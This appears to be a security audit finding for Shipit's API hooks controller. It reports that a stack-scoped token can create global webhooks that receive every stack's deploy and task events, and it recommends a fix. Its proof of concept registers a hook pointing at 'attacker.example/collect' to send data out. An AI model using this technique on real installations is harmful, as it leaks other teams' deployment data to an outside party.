### Title
Global-hook creation bypasses per-stack `ApiClient` scoping, letting a single-stack token exfiltrate every stack's task/deploy state - (File: app/controllers/shipit/api/hooks_controller.rb)

### Summary
`Shipit::ApiClient` can be scoped to a single stack via `stack_id`, and every stack-scoped API endpoint enforces that scope through `BaseController#stacks`/`#stack`. `Api::HooksController`, however, only applies that scoping when the request URL itself carries a `stack_id` (the nested route). When hitting the top-level, unscoped `/api/hooks` route, the controller resolves `stack_id` to `nil` without ever consulting `current_api_client.stack_id`, and directly reads/writes "global" `Hook` records that receive delivery of every stack's events.

### Finding Description
`ApiClient#stack_id` optionally restricts a token to a single stack, and `Api::BaseController#stacks` is supposed to be the single choke point enforcing that: [1](#0-0) 

`Api::HooksController` does not go through `stack`/`stacks` for the global-hooks path. It computes the query scope directly from the presence of a URL parameter: [2](#0-1) 

`config/routes.rb` mounts the same `HooksController` under two routes: one nested under a stack (`stack_id` always present) and one at the top level of the `api` namespace (`stack_id` never present): [3](#0-2) 

Because `stack_id` in the controller is only truthy `if params[:stack_id].present?`, hitting the unscoped `/api/hooks` route always yields `stack_id: nil`, i.e. `Hook.where(stack_id: nil)` (`Hook.global`) — regardless of what stack, if any, `current_api_client` is scoped to. The `require_permission :read, :hook` / `:write, :hook` checks are the only authorization gate on this controller, and they are independent of `stack:*` permissions and independent of `current_api_client.stack_id`: [4](#0-3) 

Global hooks are not cosmetic: `Hook.deliver` fans out to `for_stack(stack_id)`, which matches `stack_id IN (nil, <event's stack id>)` — so a global hook receives events (`stack`, `deploy`, `rollback`, `task`, `commit_status`, `merge`, `pull_request`, etc.) for **every** stack in the installation, not just the creator's: [5](#0-4) 

This breaks exactly the binding the report's bug class targets: "a stack a token authorises versus a stack it touches." A token minted with `stack_id` set (intended to only ever "touch" that one stack, enforced everywhere else by `BaseController#stacks`) can, if it also carries `write:hook`, create (or `read:hook` list/read) a hook whose `stack_id` is implicitly `nil`, and thereby observe/redirect events for stacks it was never authorized to see or modify.

### Impact Explanation
An attacker holding a stack-scoped `ApiClient` token with `write:hook` permission can register a hook pointed at an attacker-controlled `delivery_url` with `secret` of their choosing (`app/models/shipit/hook.rb`), subscribing to `deploy`, `task`, `rollback`, `commit_status`, `merge`, and `pull_request` events for every stack managed by the Shipit instance — including stacks belonging to other repositories/teams that the token was never granted access to. This is an unauthenticated (from the victim stacks' perspective) read of stack state, task streams, and deploy output for arbitrary other stacks, which the rules explicitly classify as High impact. With `read:hook` alone, an attacker can also enumerate and read the `delivery_url`/`content_type`/`events` of every existing global hook, which may itself reveal internal endpoints used for cross-system integrations.

### Likelihood Explanation
Requires only an already-issued `ApiClient` token (a supported, documented feature) scoped to a single stack that happens to also carry `write:hook` or `read:hook` permission — a plausible combination since permissions are chosen independently per client via checkboxes and nothing in the model or controller prevents pairing a `stack_id` scope with hook permissions. No additional privilege, GitHub identity, or session is required beyond possessing that one token; the request is a normal, one-line API call to `/api/hooks` instead of `/api/stacks/:stack_id/hooks`.

### Recommendation
In `Api::HooksController`, make the effective stack scope consistent with `current_api_client.stack_id`: when the client is stack-scoped, force `stack_id` to that client's stack (via `stack.id`) regardless of whether the URL supplied one, and reject (403/404) any attempt to read or write hooks with `stack_id: nil` from a stack-scoped client. Alternatively, route all hook access through `BaseController#stacks`/`#stack` so the existing scoping guarantee is not bypassable by simply omitting the URL parameter.

### Proof of Concept
1. As an administrator, create an `ApiClient` scoped to `stack_id: <stack A>` and grant it `write:hook` (e.g. intended "let this token manage webhooks for stack A only").
2. Using that client's Basic-auth token, call:
   `POST /api/hooks` with `{"delivery_url": "https://attacker.example/collect", "events": ["deploy", "task", "commit_status"]}` (no `stack_id` in the path).
3. `Api::HooksController#hooks` resolves `stack_id` to `nil` (since `params[:stack_id]` is absent), so `hooks.create(params)` creates a **global** `Hook` (`stack_id: nil`).
4. From now on, `Hook.deliver` (triggered by `Hook.emit` on every stack's deploy/task/status events) matches this hook via `for_stack(any_stack_id)` (`where(stack_id: [nil, stack_id])`) and POSTs the payload — including deploy/task metadata for stacks the client was never scoped to — to `https://attacker.example/collect`.

    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
